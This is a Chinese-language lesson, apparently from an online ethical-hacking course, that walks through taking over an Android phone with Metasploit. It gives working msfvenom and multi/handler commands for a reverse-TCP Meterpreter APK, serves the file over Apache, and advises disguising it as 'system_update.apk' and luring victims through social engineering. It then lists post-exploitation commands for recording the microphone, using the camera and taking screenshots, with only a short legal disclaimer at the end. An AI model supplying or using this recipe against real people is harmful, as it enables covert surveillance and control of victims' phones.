
# Udemy 完整道德黑客课程 2026：35-36：使用 Metasploit 载荷获取 Android 设备访问权限 📱

![](img/ff6fc8e6a251e3f97e13ca29458685ec_0.png)

在本节课中，我们将学习如何使用 Metasploit 框架生成 Android 载荷，并通过该载荷获得对目标 Android 设备的访问权限。这节课适合初学者，我们会一步步介绍从生成载荷到建立会话的完整过程，并说明在实际操作中需要注意的关键细节。无论你是刚接触渗透测试，还是希望了解移动设备安全的朋友，都能从本节课中获得基础的操作思路。

## 第一节：准备工作与获取本机 IP 地址 🔍

在开始实际操作之前，我们需要先准备好攻击环境，并确定本机的网络地址。攻击者使用的操作系统通常是基于 Linux 的发行版，比如 Kali Linux。整个过程的核心是让受害者运行一个由我们生成的 Android 安装包，从而建立反向连接。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_2.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_3.png)

首先，我们需要在终端中查看本机的 IP 地址。这个 IP 地址稍后会用来配置载荷，确保受害设备可以连接回攻击者的机器。以下是需要执行的命令：

![](img/ff6fc8e6a251e3f97e13ca29458685ec_5.png)

```bash
ifconfig
```

![](img/ff6fc8e6a251e3f97e13ca29458685ec_7.png)

执行上面的命令后，终端会输出网络接口的详细信息。你需要从中找到本机的局域网 IP 地址，例如 `192.168.0.100` 这种形式。请把这个地址记录在笔记本或记事本中，因为在后续的每一个配置步骤里都要用到它。如果不确定哪个地址是本机 IP，可以查找以 `192.168` 或 `10.` 开头的地址，通常这些就是局域网地址。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_9.png)

## 第二节：生成 Android 载荷文件 📦

上一节我们介绍了如何获取本机 IP 地址，本节中我们来看看如何使用 msfvenom 生成 Android 安装包载荷。载荷是一个特制的 APK 文件，受害者在设备上安装并运行它之后，就会把控制权交还给攻击者。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_11.png)

以下是生成载荷所需的命令结构：

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -o Android_app.apk
```

![](img/ff6fc8e6a251e3f97e13ca29458685ec_13.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_15.png)

让我们简单解释一下这个命令的各个部分：
- `-p android/meterpreter/reverse_tcp`：指定使用 Android Meterpreter 反向 TCP 载荷
- `LHOST=192.168.0.100`：设置为你在上一节记录下来的攻击者 IP 地址
- `LPORT=4444`：设置监听端口，这里使用 4444
- `-o Android_app.apk`：指定输出文件名为 `Android_app.apk`

![](img/ff6fc8e6a251e3f97e13ca29458685ec_17.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_18.png)

你也可以给这个文件起其他名字，比如 `system_update.apk` 或 `virus.apk`，目的是诱导受害者下载并安装。命令执行后，终端会提示载荷生成完成，文件大小大约在几十 KB 左右。需要注意，这里生成的是载荷文件，而不是完整的攻击利用框架，它的作用是在目标设备上运行后建立与攻击者的连接。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_20.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_21.png)

## 第三节：启动 Apache 服务器 🌐

生成载荷文件之后，我们需要把文件放在可以被受害者下载的位置。本节中我们来看看如何启动 Apache Web 服务器，以便提供 APK 文件的下载服务。Apache 是一种常用的开源 Web 服务器软件，可以将本地文件通过 HTTP 协议发布出去。

以下是启动并检查 Apache 服务的命令：

```bash
service apache2 start
service apache2 status
```

![](img/ff6fc8e6a251e3f97e13ca29458685ec_23.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_25.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_27.png)

第一个命令用于启动 Apache 服务，第二个命令用于查看服务当前的运行状态。正常情况下，状态输出中会显示 `active (running)`，这表示服务器已经正常运行。如果 Apache 没有启动成功，你将无法将载荷上传到服务器，也就无法让受害者通过浏览器下载该文件。在继续下一步之前，请务必确认服务器状态为运行中。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_29.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_30.png)

## 第四节：配置 Metasploit 多处理器监听 🎯

![](img/ff6fc8e6a251e3f97e13ca29458685ec_32.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_33.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_35.png)

有了载荷文件和 Web 服务器之后，下一步是在攻击机上启动 Metasploit 控制台，并配置监听器等待受害设备上线。本节中我们来看看如何使用 `msfconsole` 和 `multi/handler` 模块来接收反向连接。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_37.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_39.png)

以下是配置步骤所需的命令：

```bash
msfconsole
use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.0.100
set LPORT 4444
exploit
```

![](img/ff6fc8e6a251e3f97e13ca29458685ec_41.png)

请确保 `LHOST` 的值与你在第一节中记录的本机 IP 地址一致，`LPORT` 的值与生成载荷时使用的端口一致。执行 `exploit` 命令后，Metasploit 会开始监听指定端口，此时处于等待状态，直到目标设备上的载荷运行并发起连接。

## 第五节：在受害设备上安装并运行载荷 📲

配置好监听器之后，我们需要把生成的 APK 文件发送给受害者，并诱导其下载安装。本节中我们来看看如何在受害者的 Android 设备上完成安装并获得权限。常见的传递方式包括社交工程手段，比如通过电子邮件发送，或者直接取得设备后进行安装。

受害者需要在设备上执行以下操作：

![](img/ff6fc8e6a251e3f97e13ca29458685ec_43.png)

1. 使用浏览器访问攻击者提供的 APK 下载链接
2. 点击下载，系统可能会弹出警告提示文件可能包含恶意内容
3. 确认下载并打开安装程序
4. 在安装界面点击“仍要安装”或类似按钮
5. 安装完成后点击“打开”运行应用
6. 根据提示授予位置、电话、短信、麦克风、相机、联系人、文件等所有权限

Android 系统默认会将来自未知来源的 APK 文件标记为潜在危险文件，即使载荷实际上并不包含已知病毒特征，浏览器或安全软件也可能显示警告。作为攻击者，你可以忽略这些警告并继续安装。一旦应用程序运行并获得所需权限，Metasploit 控制台中就会出现一个新的会话，表明连接已经建立。

## 第六节：获取会话并控制 Android 设备 🔐

当受害设备上的载荷运行并建立连接后，我们就可以在 Metasploit 中与该设备交互了。本节中我们来看看如何列出会话、与特定会话交互，以及使用常见的后渗透命令来获取设备信息。

![](img/ff6fc8e6a251e3f97e13ca29458685ec_45.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_46.png)

如果会话处于后台状态，可以使用以下命令查看：

![](img/ff6fc8e6a251e3f97e13ca29458685ec_47.png)

![](img/ff6fc8e6a251e3f97e13ca29458685ec_49.png)

```bash
background
sessions
sessions -i 1
help
```

`background` 命令用于将当前会话放到后台，`sessions` 命令用于列出所有活跃的会话，`sessions -i 1` 用于与编号为 1 的会话进行交互，`help` 命令会列出当前会话下可用的所有命令列表。

进入会话之后，你可以使用多种命令来控制目标设备。以下是一些常用命令及其作用：

```bash
record_mic        # 录制目标设备的麦克风音频
webcam_chat       # 访问目标设备的摄像头
sysinfo           # 获取远程系统信息，如操作系统版本
webcam list       # 列出目标设备上的摄像头设备
screenshot        # 截取目标设备的屏幕图像
```

这些命令可以帮助你了解目标设备的当前状态，并获取敏感信息。例如，`sysinfo` 会告诉你目标设备运行的是哪个版本的 Android，`webcam list` 会显示前置和后置摄像头的数量。所有操作的前提是载荷没有被用户发现并卸载，只要载荷仍在运行，你就可以持续控制该设备。

## 第七节：退出会话与清理痕迹 🧹

完成测试之后，我们需要正确退出会话，并清理受害设备上的载荷文件。本节中我们来看看如何安全地结束操作，避免留下不必要的痕迹。无论是出于教学目的还是合法授权的测试，结束后的清理工作都很重要。

退出 Metasploit 会话的方法如下：

```bash
exit
```

或者直接按下 `Ctrl+C` 组合键。退出会话后，建议在受害设备上卸载并删除之前安装的 APK 文件，这样可以终止反向连接，避免设备长期处于被控状态。在实际使用中，请务必确保你拥有对目标设备的合法授权，切勿将这些技术用于任何非法用途，否则后果自负。
